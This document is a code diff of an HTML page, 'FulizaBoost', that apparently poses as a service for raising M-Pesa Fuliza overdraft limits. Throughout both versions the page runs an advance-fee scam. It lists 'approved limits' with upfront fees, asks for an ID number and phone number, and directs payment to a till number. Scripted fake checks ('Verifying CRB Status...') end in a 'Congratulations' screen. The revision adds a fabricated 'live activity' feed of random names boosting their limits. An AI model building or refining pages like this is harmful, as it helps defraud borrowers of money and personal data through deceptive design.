@@ -6,240 +6,270 @@
 <title>FulizaBoost</title>
 
 <style>
-body{
+body {
   font-family: Arial, sans-serif;
-  background:#f5f7fb;
-  margin:0;
-  text-align:center;
+  background: #f5f7f9;
+  margin: 0;
 }
 
-/* Cards */
-.card{
-  background:white;
-  margin:20px;
-  padding:25px;
-  border-radius:20px;
-  box-shadow:0 10px 30px rgba(0,0,0,0.08);
+/* TITLE */
+h1 {
+  text-align: center;
+  margin: 15px 0;
 }
 
-/* Button */
-.btn{
-  background:#1f8f43;
-  color:white;
-  padding:15px;
-  border:none;
-  border-radius:10px;
-  width:100%;
-  font-size:16px;
-  margin-top:15px;
+/* LIVE ACTIVITY */
+.live {
+  background: #fff;
+  padding: 12px;
+  margin: 10px;
+  border-radius: 12px;
+  font-size: 14px;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.05);
 }
 
-/* Input */
-input{
-  width:100%;
-  padding:14px;
-  margin-top:10px;
-  border-radius:10px;
-  border:1px solid #ddd;
+/* GRID */
+.grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 12px;
+  padding: 10px;
 }
 
-/* Grid amounts */
-.grid{
-  display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:12px;
-  padding:15px;
+/* CARD */
+.box {
+  background: #fff;
+  padding: 18px;
+  border-radius: 16px;
+  text-align: center;
+  border: 2px solid transparent;
 }
 
-.box{
-  background:white;
-  padding:18px;
-  border-radius:15px;
-  box-shadow:0 5px 15px rgba(0,0,0,0.05);
-  cursor:pointer;
+.box.selected {
+  border: 2px solid #1e8e3e;
+  background: #eaf6ee;
 }
 
-.box h3{
-  color:#1f8f43;
-  margin:0;
+.amount {
+  font-size: 20px;
+  font-weight: bold;
+  color: #1e8e3e;
 }
 
-/* Loader */
-.loader{
-  border:5px solid #eee;
-  border-top:5px solid #1f8f43;
-  border-radius:50%;
-  width:50px;
-  height:50px;
-  margin:20px auto;
-  animation:spin 1s linear infinite;
-}
-@keyframes spin{
-  100%{transform:rotate(360deg);}
+.fee {
+  font-size: 12px;
+  color: #888;
 }
 
-/* Popup */
-.popup{
-  position:fixed;
+/* SUPPORT */
+.support {
+  text-align: center;
+  margin: 10px 0 90px;
+  color: #1e8e3e;
+  font-size: 14px;
+}
+
+/* STICKY BUTTON */
+.sticky-btn {
+  position: fixed;
+  bottom: 0;
+  width: 100%;
+  background: #fff;
+  padding: 10px;
+  box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
+}
+
+.sticky-btn button {
+  width: 95%;
+  padding: 16px;
+  border: none;
+  border-radius: 14px;
+  background: #1e8e3e;
+  color: white;
+  font-size: 16px;
+  font-weight: bold;
+}
+
+/* MODAL */
+.modal {
+  display: none;
+  position: fixed;
   top:0;
   left:0;
   width:100%;
   height:100%;
-  background:rgba(0,0,0,0.6);
-  display:none;
-  justify-content:center;
-  align-items:center;
+  background: rgba(0,0,0,0.6);
+  justify-content: center;
+  align-items: center;
 }
 
-.popup-content{
-  background:white;
-  width:90%;
-  max-width:350px;
-  border-radius:20px;
-  overflow:hidden;
+.modal-content {
+  background: #fff;
+  padding: 20px;
+  border-radius: 20px;
+  width: 90%;
+  text-align: center;
 }
 
-.popup-header{
-  background:#1f8f43;
-  color:white;
-  padding:20px;
-  font-weight:bold;
+/* INPUT */
+input {
+  width: 100%;
+  padding: 12px;
+  margin: 10px 0;
+  border-radius: 10px;
+  border: 1px solid #ccc;
 }
 
-.popup-body{
-  padding:20px;
+/* LOADER */
+.loader {
+  border: 5px solid #eee;
+  border-top: 5px solid #1e8e3e;
+  border-radius: 50%;
+  width: 50px;
+  height: 50px;
+  margin: auto;
+  animation: spin 1s linear infinite;
 }
 
-.row{
-  display:flex;
-  gap:10px;
-}
-
-.cancel{
-  background:#ddd;
-  color:black;
-}
-
-.pay{
-  background:#1f8f43;
+@keyframes spin {
+  100% { transform: rotate(360deg); }
 }
 </style>
 </head>
 
 <body>
 
-<!-- STEP 1 -->
-<div id="step1" class="card">
-  <h2>Fuliza Plus+</h2>
-  <p>Verify your identity to unlock higher limits</p>
-  <input id="phone" placeholder="Enter M-Pesa Number">
-  <button class="btn" onclick="startProcess()">Check My Eligibility</button>
+<h1>FulizaBoost</h1>
+
+<!-- LIVE ACTIVITY -->
+<div class="live" id="liveActivity">
+  Loading activity...
 </div>
 
-<!-- STEP 2 LOADING -->
-<div id="loading" class="card" style="display:none;">
-  <div class="loader"></div>
-  <h3 id="loadingText">Connecting...</h3>
-  <p>Accessing secure databases...</p>
+<h3 style="padding-left:10px;">Select Your New Approved Limit</h3>
+
+<div class="grid" id="grid"></div>
+
+<div class="support">
+  💬 Need help? Chat with Support
 </div>
 
-<!-- STEP 3 SUCCESS -->
-<div id="success" class="card" style="display:none;">
-  <h2>✅ Congratulations!</h2>
-  <p id="resultText"></p>
-  <button class="btn" onclick="showLimits()">Proceed to Upgrade Limit</button>
+<!-- STICKY BUTTON -->
+<div class="sticky-btn">
+  <button id="upgradeBtn">⚡ SELECT A LIMIT</button>
 </div>
 
-<!-- STEP 4 LIMITS -->
-<div id="limits" style="display:none;">
-  <h2>FulizaBoost</h2>
-  <p>Select Your New Approved Limit</p>
-
-  <div class="grid">
-    <div class="box" onclick="pay(3000,250)"><h3>Ksh 3,000</h3><small>Fee Ksh 250</small></div>
-    <div class="box" onclick="pay(5000,293)"><h3>Ksh 5,000</h3><small>Fee Ksh 293</small></div>
-    <div class="box" onclick="pay(7500,350)"><h3>Ksh 7,500</h3><small>Fee Ksh 350</small></div>
-    <div class="box" onclick="pay(10000,500)"><h3>Ksh 10,000</h3><small>Fee Ksh 500</small></div>
-    <div class="box" onclick="pay(12500,747)"><h3>Ksh 12,500</h3><small>Fee Ksh 747</small></div>
-    <div class="box" onclick="pay(16000,898)"><h3>Ksh 16,000</h3><small>Fee Ksh 898</small></div>
-    <div class="box" onclick="pay(21000,1015)"><h3>Ksh 21,000</h3><small>Fee Ksh 1015</small></div>
-    <div class="box" onclick="pay(25500,1220)"><h3>Ksh 25,500</h3><small>Fee Ksh 1220</small></div>
-    <div class="box" onclick="pay(30000,1533)"><h3>Ksh 30,000</h3><small>Fee Ksh 1533</small></div>
-    <div class="box" onclick="pay(35000,1730)"><h3>Ksh 35,000</h3><small>Fee Ksh 1730</small></div>
-    <div class="box" onclick="pay(45000,2000)"><h3>Ksh 45,000</h3><small>Fee Ksh 2000</small></div>
-    <div class="box" onclick="pay(60000,2250)"><h3>Ksh 60,000</h3><small>Fee Ksh 2250</small></div>
-    <div class="box" onclick="pay(70000,2500)"><h3>Ksh 70,000</h3><small>Fee Ksh 2500</small></div>
-  </div>
-</div>
-
-<!-- STEP 5 POPUP -->
-<div class="popup" id="popup">
-  <div class="popup-content">
-    <div class="popup-header">
-      Limit will be boosted
-    </div>
-
-    <div class="popup-body">
-      <p>Enter your details for verification.</p>
-
-      <input placeholder="ID Number">
-      <input id="payPhone">
-
-      <div class="row">
-        <button class="btn cancel" onclick="closePopup()">Cancel</button>
-        <button class="btn pay" id="payBtn">Pay</button>
-      </div>
-
-      <p style="font-size:12px;margin-top:10px;">
-        Pay via Till Number <b>6363781</b>
-      </p>
-    </div>
-  </div>
+<!-- MODAL -->
+<div class="modal" id="modal">
+  <div class="modal-content" id="modalContent"></div>
 </div>
 
 <script>
-let userPhone="";
 
+/* DATA */
+const data = [
+  ["3,000","250"],["5,000","293"],
+  ["7,500","350"],["10,000","500"],
+  ["12,500","747"],["16,000","898"],
+  ["21,000","1015"],["25,500","1220"],
+  ["30,000","1533"],["35,000","1730"],
+  ["45,000","2000"],["60,000","2250"],
+  ["70,000","2500"]
+];
+
+let selected = "";
+
+/* LOAD GRID */
+const grid = document.getElementById("grid");
+
+data.forEach(d=>{
+  let div = document.createElement("div");
+  div.className="box";
+  div.innerHTML=`
+    <div class="amount">Ksh ${d[0]}</div>
+    <div class="fee">Fee: Ksh ${d[1]}</div>
+  `;
+  div.onclick=()=>{
+    document.querySelectorAll(".box").forEach(b=>b.classList.remove("selected"));
+    div.classList.add("selected");
+
+    selected = d[0];
+
+    document.getElementById("upgradeBtn").innerText =
+      "⚡ UPGRADE TO KSH " + d[0];
+  }
+  grid.appendChild(div);
+});
+
+/* LIVE ACTIVITY */
+const names=["John","Faith","Brian","Kevin","Mary","James"];
+
+setInterval(()=>{
+  let n = names[Math.floor(Math.random()*names.length)];
+  let amt = data[Math.floor(Math.random()*data.length)][0];
+
+  document.getElementById("liveActivity").innerText =
+    `${n} boosted to Ksh ${amt} just now`;
+
+},3000);
+
+/* BUTTON CLICK */
+document.getElementById("upgradeBtn").onclick = () => {
+
+  if(!selected){
+    alert("Select amount first");
+    return;
+  }
+
+  document.getElementById("modal").style.display="flex";
+
+  document.getElementById("modalContent").innerHTML = `
+    <h3>Secure Fuliza Upgrade</h3>
+    <p>Upgrade to <b>Ksh ${selected}</b></p>
+
+    <input type="text" placeholder="Enter ID Number">
+    <input type="text" placeholder="Enter Phone Number">
+
+    <p>Pay via Till Number: <b>6363781</b></p>
+
+    <button onclick="startProcess()">Proceed</button>
+  `;
+};
+
+/* PROCESS FLOW */
 function startProcess(){
-  userPhone=document.getElementById("phone").value;
-  document.getElementById("step1").style.display="none";
-  document.getElementById("loading").style.display="block";
 
-  let steps=[
-    "Connecting...",
-    "Verifying CRB Status...",
-    "Finalizing Trust Score...",
-    "Checking Usage History..."
-  ];
+  const modal = document.getElementById("modalContent");
 
-  let i=0;
-  let interval=setInterval(()=>{
-    document.getElementById("loadingText").innerText=steps[i];
-    i++;
-    if(i>=steps.length){
-      clearInterval(interval);
-      document.getElementById("loading").style.display="none";
-      document.getElementById("success").style.display="block";
-      document.getElementById("resultText").innerText=
-      userPhone+" is eligible for a boost.";
-    }
-  },1500);
+  modal.innerHTML = `
+    <div class="loader"></div>
+    <p>Connecting...</p>
+  `;
+
+  setTimeout(()=>{
+    modal.innerHTML = `
+      <div class="loader"></div>
+      <p>Verifying CRB Status...</p>
+    `;
+  },2000);
+
+  setTimeout(()=>{
+    modal.innerHTML = `
+      <div class="loader"></div>
+      <p>Finalizing Trust Score...</p>
+    `;
+  },4000);
+
+  setTimeout(()=>{
+    modal.innerHTML = `
+      <h2>✅ Congratulations!</h2>
+      <p>You qualify for Fuliza Boost</p>
+      <button onclick="location.reload()">Done</button>
+    `;
+  },6000);
+
 }
 
-function showLimits(){
-  document.getElementById("success").style.display="none";
-  document.getElementById("limits").style.display="block";
-}
-
-function pay(amount,fee){
-  document.getElementById("popup").style.display="flex";
-  document.getElementById("payPhone").value=userPhone;
-  document.getElementById("payBtn").innerText="Pay Ksh "+fee;
-}
-
-function closePopup(){
-  document.getElementById("popup").style.display="none";
-}
 </script>
 
 </body>
